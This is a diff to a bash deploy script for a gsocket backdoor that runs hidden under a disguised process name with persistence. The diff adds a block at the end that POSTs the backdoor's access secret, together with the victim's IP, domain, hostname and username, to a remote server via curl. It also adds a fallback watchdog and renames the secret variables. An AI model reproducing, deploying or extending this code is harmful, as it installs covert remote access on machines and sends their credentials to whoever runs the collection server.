-		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
-		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
-	elif [[ -n $IS_USE_WGET ]]; then
-		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
-		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
-	fi
-	[[ -n $ok ]] && { OK_OUT; return; }
-
-	FAIL_OUT
 }
 
 try_network()
@@ -1588,8 +1583,8 @@ gs_start()
 {
 	# If installed as systemd then try to start it
 	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
-	[[ -n "$IS_GS_RUNNING" ]] && return
-
+	# [[ -n "$IS_GS_RUNNING" ]] && stop_all_instances
+	# stop_all_instances
 	# Scenario to consider:
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
 	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
@@ -1607,17 +1602,18 @@ gs_start()
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: OLD is already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
-			# HERE: Already running. Skipped installation (sec.dat has not changed).
+			# HERE: Already running. Skipped installation (sec.txt has not changed).
 			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 			unset IS_NEED_START
 		else
-			# HERE: sec.dat has been updated
+			# HERE: sec.txt has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
 			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
 			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
+		# HERE: OLD is NOT running.
 		OK_OUT ""
 	fi
 
@@ -1628,9 +1624,14 @@ gs_start()
 		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
-		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		local _rcb="${USER_SEC_FILE%.*}.rcb"
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GSOCKET_RCB_FILE=\""$_rcb"\" GS_ARGS=\"-s "$SUPER_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
+
+	# Shell-based RC watchdog as fallback (for non-pthread builds)
+	rc_watcher_start
+
 }
 
 init_vars
@@ -1640,25 +1641,26 @@ init_vars
 
 init_setup
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
-[[ -n "$X" ]] && GS_SECRET_X="$X"
+[[ -n "$X" ]] && SUPER_SECRET_X="$X"
+[[ -n "$API_KEY" ]] && APIKEY="$API_KEY"
 
 if [[ -z $S ]]; then
 	# HERE: S= is NOT set
-	if [[ $UID -eq 0 ]]; then
-		gs_secret_reload "$SYSTEMD_SEC_FILE" 
-		gs_secret_reload "$RCLOCAL_SEC_FILE" 
-	fi
-	gs_secret_reload "$USER_SEC_FILE"
+	# if [[ $UID -eq 0 ]]; then
+	# 	SUPER_SECRET_reload "$SYSTEMD_SEC_FILE" 
+	# 	SUPER_SECRET_reload "$RCLOCAL_SEC_FILE" 
+	# fi
+	# SUPER_SECRET_reload "$USER_SEC_FILE"
 
-	if [[ -n $GS_SECRET_FROM_FILE ]]; then
-		GS_SECRET="${GS_SECRET_FROM_FILE}"
+	if [[ -n $SUPER_SECRET_FROM_FILE ]]; then
+		SUPER_SECRET="${SUPER_SECRET_FROM_FILE}"
 	else
-		GS_SECRET="${GS_SECRET_X}"
+		SUPER_SECRET="${SUPER_SECRET_X}"
 	fi
 
-	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
+	DEBUGF "SUPER_SECRET=$SUPER_SECRET (F=${SUPER_SECRET_FROM_FILE}, X=${SUPER_SECRET_X})"
 else
-	GS_SECRET="$S"
+	SUPER_SECRET="$S"
 	URL_BIN="$URL_BIN_FULL"
 fi
 
@@ -1697,7 +1699,7 @@ fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
-webhooks
+# webhooks
 
 HOWTO_CONNECT_OUT
 
@@ -1708,6 +1710,23 @@ else
 	gs_start
 fi
 
-echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -en "Sending Secret Key To Server............................................"
+
+HTTP_STATUS=$(curl -fsSL -X POST "$URL" \
+    -H "Content-Type: application/json" \
+    -H "x-api-key: $APIKEY" \
+    -d "{
+        \"secret_key\": \"$SUPER_SECRET\",
+        \"ip\": \"$IP_ADDRESS\",
+        \"domain\": \"$DOMAIN\",
+        \"hostname\": \"$HOSTNAME\",
+        \"user\": \"$CURRENT_USER\"
+    }" -s -o /dev/null -w "%{http_code}")
+
+if [[ $HTTP_STATUS -ge 200 && $HTTP_STATUS -lt 300 ]]; then
+    OK_OUT
+else
+    FAIL_OUT
+fi
 
 exit_code 0
